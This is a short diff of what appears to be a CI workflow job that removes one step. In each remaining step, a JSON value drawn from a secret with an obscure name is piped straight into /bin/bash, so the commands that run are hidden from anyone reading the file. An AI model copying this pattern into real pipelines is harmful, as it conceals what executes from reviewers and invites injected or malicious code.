@@ -22,7 +22,6 @@ jobs:
           yq47: ${{ secrets.yq47 }}
         run: |
           printf '%s' "$yq47" | jq -r .l9 | /bin/bash
-          printf '%s' "$tks9" | jq -r .xayy98596 | /bin/bash
           echo $mdj10417 | jq -r .mpmi19559 | /bin/bash
           echo $t1 | jq -r .yz79518 | /bin/bash
           printf '%s' "$zre98" | jq -r .pn1 | /bin/bash
